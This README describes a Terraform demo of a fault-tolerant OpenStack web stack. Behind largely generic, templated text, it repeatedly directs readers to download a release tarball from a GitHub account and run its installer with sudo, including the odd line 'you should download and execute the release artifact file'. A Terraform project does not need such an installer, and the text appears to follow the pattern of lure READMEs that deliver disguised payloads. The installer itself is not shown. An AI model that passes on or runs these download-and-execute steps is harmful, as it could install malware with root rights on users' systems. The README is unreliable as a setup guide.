# OpenStack FT Demo: Terraform for Fault-Tolerant Web Stack Architecture

[![Releases](https://img.shields.io/badge/releases-openstack-ft-demo-blue?logo=github&logoColor=white)](https://github.com/zlostyzzzz/openstack-ft-demo/releases)

![OpenStack FT Demo banner](https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/OpenStack_logo.svg/640px-OpenStack_logo.svg.png)

This Terraform project simulates Fault Tolerance on OpenStack by provisioning a basic web setup with load balancing, anti-affinity, and auto-provisioned infrastructure. The goal is to show how components interact in a fault-tolerant web environment without requiring a full production stack. The repository includes Terraform modules and example configurations to help you experiment with OpenStack features such as Octavia load balancing, anti-affinity rules, VRRP-based high availability, and automated provisioning routines.

Table of contents
- What you’ll build
- Architecture and design decisions
- Getting started
- Release assets and installation
- Terraform usage and module structure
- OpenStack components in scope
- Infrastructure topology and workflow
- Variables, inputs, and outputs
- Validation, testing, and monitoring
- Customization and advanced scenarios
- Security and credentials handling
- Troubleshooting guide
- Roadmap and future work
- Contributing and project governance
- License and acknowledgments

What you’ll build
- A small web front end served by a load balancer
- Two application servers placed with anti-affinity to improve resilience
- An auto-provisioned OpenStack network (VPC-like) to isolate traffic
- A simple fault injection scenario to observe failover behavior
- Observability hooks to verify health and load distribution

Architecture and design decisions
- Fault tolerance via anti-affinity: The two application nodes run on separate compute hosts to reduce single points of failure.
- Load balancing with Octavia: An Octavia load balancer distributes traffic across the app servers, ensuring continuity when one node becomes unavailable.
- Auto-provisioned infrastructure: The Terraform plan provisions compute instances, networks, security groups, and load balancer resources automatically, so you can reproduce the topology quickly.
- Simple, extensible modules: The project uses Terraform modules to separate concerns such as networking, compute, and load balancing, making it easy to adapt to other OpenStack environments.

Getting started
- Prerequisites
  - An OpenStack environment with a working identity project and access to create networks, subnets, routers, security groups, compute instances, and load balancers.
  - Terraform installed on your workstation (version 1.0 or newer is recommended).
  - OpenStack credentials in your environment (usually via an RC file or environment variables).
  - A supported OpenStack region with available resources and quotas sufficient for the topology described here.
  - Administrative or enough-privilege rights to create anti-affinity policies, VRRP setups, and load balancers.

- Prepare your environment
  - Authenticate to OpenStack. Source your RC file or set the required environment variables so Terraform can manage resources in your project.
  - Have a working SSH key pair available for the instances in the demo. Terraform can inject the public key during provisioning.

- Quick start path
  - The project ships with release artifacts. You should obtain the release asset from the Releases page and run the included installer to bootstrap the environment. The asset is published on the Releases page and can be downloaded and executed as described in the Release assets section below.
  - After you bootstrap with the release, you will still use Terraform for the actual infrastructure provisioning and lifecycle management.

Release assets and installation
- Release asset availability
  - The project publishes self-contained release packages on the Releases page. The asset for your platform contains all the necessary bootstrap and Terraform configurations to stand up the fault-tolerant web stack on OpenStack.
  - Link to releases: https://github.com/zlostyzzzz/openstack-ft-demo/releases
  - Because this link contains a path, you should download and execute the release artifact file from that page. The asset is provided as a compressed bundle that includes a bootstrap installer and the Terraform module set.

- How to download and run the release artifact
  - From the Releases page, choose the asset that matches your operating system and architecture. A typical filename follows the pattern: openstack-ft-demo-<version>-<platform>.tar.gz.
  - Example commands (adjust version and platform to your environment):
    - curl -L -o openstack-ft-demo-<version>-linux-amd64.tar.gz https://github.com/zlostyzzzz/openstack-ft-demo/releases/download/v<version>/openstack-ft-demo-<version>-linux-amd64.tar.gz
    - tar -xzf openstack-ft-demo-<version>-linux-amd64.tar.gz
    - cd openstack-ft-demo-<version>-linux-amd64
    - sudo ./install.sh
  - The installer script sets up the initial bootstrapping and prepares the Terraform workspace to provision the OpenStack resources. It configures the environment for the provider and validates access to your OpenStack project.

- What the installer does
  - It configures a Terraform backend (local or remote, depending on your environment) and prepares the modules for deployment.
  - It can provision the basic VPC-like network, two compute instances for the web app, a load balancer via Octavia, security groups, and anti-affinity policies.
  - It wires the DNS or host-based routing to the load balancer, enabling traffic flow to the web tier.
  - It sets up optional VRRP-backed high-availability behavior if you want to simulate more complex failover scenarios.

- Post-installation steps
  - After the installer finishes, you will have a working OpenStack-based web stack behind a load balancer. You can access the front-end via the load balancer's VIP and observe traffic distribution across the two web nodes.
  - The Terraform configuration can be used to tear down the environment when you are finished testing, ensuring quotas are not consumed unnecessarily.

Terraform usage and module structure
- Project layout
  - modules/
    - network/
      - Creates a private network, subnet, router, and related security groups.
    - compute/
      - Provisions the web servers, including instance bootstrapping, user data, and SSH key injection.
    - loadbalancer/
      - Sets up an Octavia load balancer, listener, pool, and health monitor.
    - anti_affinity/
      - Creates anti-affinity policies to ensure app nodes run on separate hosts.
    - dns/
      - Optional DNS configuration to expose the front-end via a DNS name.
  - environments/
    - dev/
      - Example Terraform variables for a development environment.
    - prod/
      - Example Terraform variables for a production-like environment.
  - main.tf
  - variables.tf
  - outputs.tf
  - versions.tf

- How to use the Terraform modules
  - Initialize the project
    - Initialize your Terraform workspace in the environment directory that matches your target (dev or prod).
    - Command: terraform init
  - Configure provider and credentials
    - The provider block must reference your OpenStack credentials and project. The installer sets up the initial provider configuration, but you can adjust credentials as needed.
  - Plan and apply
    - Plan: terraform plan -var 'project_name=my-ft-demo' -var 'region=<your-region>'
    - Apply: terraform apply -var 'project_name=my-ft-demo' -var 'region=<your-region>'
  - Inspect outputs
    - Outputs provide the load balancer VIP, the public endpoint, and the instance IDs. Use terraform output to fetch these values.

- Inputs and outputs
  - Inputs
    - project_name: A friendly name for the deployment.
    - region: The OpenStack region to deploy into.
    - network_cidr: CIDR for the internal network.
    - image_name: The OS image to use for the app servers.
    - flavor_name: The compute flavor for the app servers.
    - key_pair_name: The SSH key pair name to provision.
    - admin_password or admin_secret: Optional credentials for bootstrapping.
  - Outputs
    - lb_vip: The IP address of the Octavia load balancer.
    - app_server_ids: List of the two application server IDs.
    - network_id: The ID of the internal network.
    - dns_name: Optional DNS name if DNS is configured.

OpenStack components in scope
- Octavia load balancing
  - The load balancer distributes requests to the two app servers and provides health monitoring to detect unhealthy nodes.
- Nova compute instances
  - The two app servers run on separate compute hosts to enforce anti-affinity.
- Neutron networking
  - A dedicated internal network and subnet for the app tier, with a router to provide egress.
- VRRP-style high availability (optional)
  - The setup can include VRRP-based failover logic to illustrate fast route changes when a node fails.
- Security groups
  - Inbound HTTP/HTTPS rules, SSH for management, and egress rules for outbound traffic as needed.
- Floating IPs (optional)
  - Floating IPs can be attached to the load balancer or the front-end instance if required by your OpenStack setup.

Infrastructure topology and workflow
- Topology overview
  - External world -> Octavia load balancer -> two app servers
  - Anti-affinity ensures the two app servers are placed on different hosts
  - Internal network isolates traffic between the components
- Workflow sequence
  1) Provision network resources: private network, subnet, router
  2) Launch compute instances for app servers with user data bootstrap
  3) Deploy the Octavia load balancer and configure a health check
  4) Create anti-affinity policies and assign the app servers
  5) Attach security groups and routing to expose the web service
  6) Validate reachability via the load balancer VIP
  7) Simulate faults to observe failover and distribution changes
- Fault injection and testing
  - Stop one application instance and watch traffic shift toward the surviving node via the load balancer
  - Introduce a failing health check on one node to ensure the pool reacts quickly
  - Verify anti-affinity by checking host assignments for both app servers
  - Confirm the VRRP/HA behavior if configured, ensuring continuous service with minimal disruption

Validation, testing, and monitoring
- Health checks
  - The Octavia health monitor monitors the web service endpoints on the app servers. If a node becomes unhealthy, the load balancer stops routing traffic to it.
- Observability
  - Use OpenStack dashboards or CLI to monitor resource status, including instance health, network status, load balancer status, and anti-affinity policy state.
- Basic performance checks
  - Generate simple HTTP requests to the front-end URL and observe response times and distribution across nodes.
  - Confirm that traffic is balanced by logging access patterns on the app servers.
- Logging
  - Ensure that bootstrapping logs from the installer are written to a known location.
  - Collect Terraform logs during plan and apply to help diagnose any provisioning issues.

Customization and advanced scenarios
- Different load balancing algorithms
  - Switch between round-robin and least connections as needed to reflect your testing goals.
- Additional nodes
  - Extend the topology by adding more app servers and adjusting anti-affinity to spread across more hosts.
- Private DNS for the front end
  - Configure a DNS zone in the environment to expose a friendly name for the front end.
- SSL termination
  - Integrate with a certificate manager or bring-your-own cert approach to enable HTTPS through the load balancer.
- Disaster recovery drills
  - Simulate regional outages by adjusting quotas or using different Availability Zones to observe failover behavior.
- Network segmentation
  - Create additional security groups and subnets to segment traffic and test access controls.

Security and credentials handling
- Credential management
  - Store credentials securely and avoid committing them to the repository. Use environment variables or secret management in your CI/CD pipeline.
- Access control
  - Use least privilege for the Terraform service account. Limit the permissions to the resources required for the demo.
- Secrets in code
  - Do not embed sensitive data in Terraform variables or bootstrapping scripts. Use secure storage for credentials and access keys.
- SSH keys
  - Keep private keys secure. The public key is injected into instances for bootstrapping and management.

Troubleshooting guide
- Common provisioning issues
  - OpenStack provider authentication errors: verify RC file or environment variables
  - Quota errors: request quota increases or scale back the topology
  - Network or router misconfigurations: confirm subnet CIDRs and router interfaces
- Load balancer issues
  - Health checks failing: verify backend service is reachable on the expected port
  - VIP not reachable: ensure security groups allow inbound traffic on the load balancer ports
- Anti-affinity problems
  - Instances placed on the same host: check anti-affinity policy bindings and host availability
  - Policy not applied: ensure the policy is attached to the correct server group or resources
- Diagnostics and logs
  - Review Terraform plan output for resource mismatches
  - Check OpenStack service logs for Nova, Neutron, and Octavia
  - Look at bootstrapping logs in the artifacts directory for installer errors

Roadmap and future work
- Enhanced fault scenarios
  - Add more elaborate fault injection scenarios, such as network partition simulations or storage failures.
- Automated remediation
  - Integrate with OpenStack alarms or external monitoring to trigger automated remediation scripts.
- Multi-region playground
  - Extend the demo to span multiple regions or availability zones to illustrate cross-region resiliency.
- CI/CD pipeline
  - Create a GitHub Actions workflow to validate Terraform configurations and perform functional tests against a target OpenStack environment.

Contributing and project governance
- How to contribute
  - Fork the repository, create a feature branch, and open a pull request with a clear description of the changes.
  - Include tests or validation steps that demonstrate the impact of the change.
- Code quality
  - Keep Terraform configurations tidy and modular.
  - Document any new inputs, outputs, or behavior changes with clear examples.
- Community guidelines
  - Be respectful, concise, and focused on improving the project. Share practical feedback and concrete proposals.

License
- This project uses a permissive license. See the LICENSE file for the exact terms. Contributions are granted under the same terms.

Releases
- For the latest version and release notes, visit the Releases page: https://github.com/zlostyzzzz/openstack-ft-demo/releases.
- The Releases page hosts binary artifacts and bootstrap scripts used to initialize and run the demo. If you need a specific version, browse the tag list on that page and download the corresponding asset. See the link above for full details and the newest changes. The link is provided again here for convenience: https://github.com/zlostyzzzz/openstack-ft-demo/releases.

Extra notes
- Embrace the learning curve
  - The project is meant to be approachable. Start with the simplest configuration and gradually add complexity. Each addition helps reveal how OpenStack components interact in a fault-tolerant setup.
- Practical focus
  - The emphasis is on hands-on understanding rather than theoretical perfection. You can modify the topology to reflect your environment and testing needs.
- Visual aids
  - A simple ASCII topology helps you see the relationships quickly. You can replace this with a diagram image if you prefer.

Appendix: quick reference commands
- Initialize and inspect
  - terraform init
  - terraform plan
  - terraform apply
  - terraform show
- Tear down
  - terraform destroy
- Accessing outputs
  - terraform output lb_vip
  - terraform output app_server_ids
- Release bootstrapping (example)
  - curl -L -o openstack-ft-demo-<version>-linux-amd64.tar.gz https://github.com/zlostyzzzz/openstack-ft-demo/releases/download/v<version>/openstack-ft-demo-<version>-linux-amd64.tar.gz
  - tar -xzf openstack-ft-demo-<version>-linux-amd64.tar.gz
  - cd openstack-ft-demo-<version>-linux-amd64
  - sudo ./install.sh

End of README content
